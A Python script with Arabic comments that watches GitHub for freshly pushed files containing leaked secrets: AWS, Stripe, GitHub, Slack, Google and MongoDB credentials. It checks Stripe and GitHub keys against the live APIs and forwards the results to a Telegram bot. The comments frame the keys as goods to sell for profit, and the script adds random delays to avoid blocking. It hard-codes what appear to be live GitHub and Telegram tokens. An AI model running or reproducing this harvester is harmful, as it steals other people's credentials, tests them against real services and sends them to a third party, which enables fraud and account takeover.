import sys
import re
import time
import random
import requests
from datetime import datetime, timedelta

# =================================================================
# التوكنات المضمنة (حسب أمر المستخدم، بدون الحاجة لأسرار GitHub)
# =================================================================
PAT_TOKEN = "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"
TELEGRAM_TOKEN = "8914882875:AAGmoUu_Ckl16HA0wrcM6YICNz1ZH_WphCQ"
TELEGRAM_CHAT_ID = "6306556778"
# =================================================================

# أنماط البحث (أكثر المفاتيح طلباً في السوق)
PATTERNS = {
    'aws': r'(AKIA|ASIA)[A-Z0-9]{16}',
    'stripe_live': r'sk_live_[A-Za-z0-9]{24}',
    'github_token': r'ghp_[A-Za-z0-9]{36}',
    'slack_token': r'xox[baprs]-[A-Za-z0-9]{10,48}',
    'google_api': r'AIza[0-9A-Za-z-_]{35}',
    'mongodb_uri': r'mongodb\+srv://[^:]+:[^@]+@[^/]+',
}

# ------------------- دوال التحقق الفعلي -------------------
def validate_aws(key):
    try:
        if len(key) >= 16 and key.startswith(('AKIA', 'ASIA')):
            return True
        return False
    except:
        return False

def validate_stripe(key):
    try:
        resp = requests.get(
            'https://api.stripe.com/v1/balance',
            headers={'Authorization': f'Bearer {key}'},
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def validate_github(key):
    try:
        resp = requests.get(
            'https://api.github.com/user',
            headers={'Authorization': f'token {key}'},
            timeout=10
        )
        return resp.status_code == 200
    except:
        return False

def validate_generic(key):
    return True  # نرسل الباقي دون تحقق للربح السريع

VALIDATORS = {
    'aws': validate_aws,
    'stripe_live': validate_stripe,
    'github_token': validate_github,
}

# ------------------- البحث في GitHub -------------------
def search_github(query, token):
    headers = {
        'Authorization': f'token {token}',
        'Accept': 'application/vnd.github.v3+json'
    }
    # نبحث في الملفات المرفوعة خلال آخر ساعة فقط
    time_filter = (datetime.utcnow() - timedelta(hours=1)).isoformat() + 'Z'
    url = f"https://api.github.com/search/code?q={query}+pushed:>{time_filter}&per_page=30"
    try:
        resp = requests.get(url, headers=headers, timeout=20)
        if resp.status_code == 200:
            return resp.json().get('items', [])
        else:
            print(f"Search API Error: {resp.status_code}")
            return []
    except Exception as e:
        print(f"Network Error: {e}")
        return []

# ------------------- الإرسال الفوري إلى تليجرام -------------------
def send_to_telegram(bot_token, chat_id, key_type, key_value, raw_url):
    msg = (
        f"🔑 *{key_type.upper()}*\n"
        f"`{key_value}`\n"
        f"📁 {raw_url}\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}"
    )
    try:
        url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
        payload = {
            'chat_id': chat_id,
            'text': msg,
            'parse_mode': 'Markdown'
        }
        requests.post(url, json=payload, timeout=10)
        print(f"[+] تم إرسال {key_type} بنجاح")
    except Exception as e:
        print(f"[-] فشل الإرسال: {e}")

# ------------------- التشغيل الرئيسي -------------------
def main():
    token = PAT_TOKEN
    bot_token = TELEGRAM_TOKEN
    chat_id = TELEGRAM_CHAT_ID

    # تأكد من وجود البيانات
    if not token:
        print("ERROR: PAT_TOKEN غير موجود")
        sys.exit(1)
    if not bot_token or not chat_id:
        print("ERROR: بيانات التليجرام غير موجودة")
        sys.exit(1)

    print(f"[*] بدء الصيد باستخدام التوكن: {token[:10]}... (مخفي)")
    
    for name, pattern in PATTERNS.items():
        results = search_github(f'"{pattern}"', token)
        print(f"[*] فحص {name}: {len(results)} ملف")
        
        for item in results:
            # تحويل الرابط إلى رابط خام لتحميل المحتوى
            raw_url = item.get('html_url', '').replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
            if not raw_url:
                continue
                
            try:
                resp = requests.get(raw_url, timeout=15)
                if resp.status_code != 200:
                    continue
                    
                # استخراج كل المفاتيح المطابقة للنمط من الملف
                matches = re.findall(pattern, resp.text)
                for m in set(matches):  # نزيل التكرارات
                    valid = True
                    if name in VALIDATORS:
                        valid = VALIDATORS[name](m)
                    if valid:
                        send_to_telegram(bot_token, chat_id, name, m, raw_url)
                    # تأخير عشوائي لتجنب الحظر
                    time.sleep(random.uniform(1.0, 2.5))
                    
            except Exception as e:
                print(f"[-] خطأ في معالجة {raw_url}: {e}")
                
            time.sleep(random.uniform(0.3, 0.8))

    print("[+] انتهت دورة الصيد الحالية. أنتظر أمرك يا سيدي.")

if __name__ == "__main__":
    main()
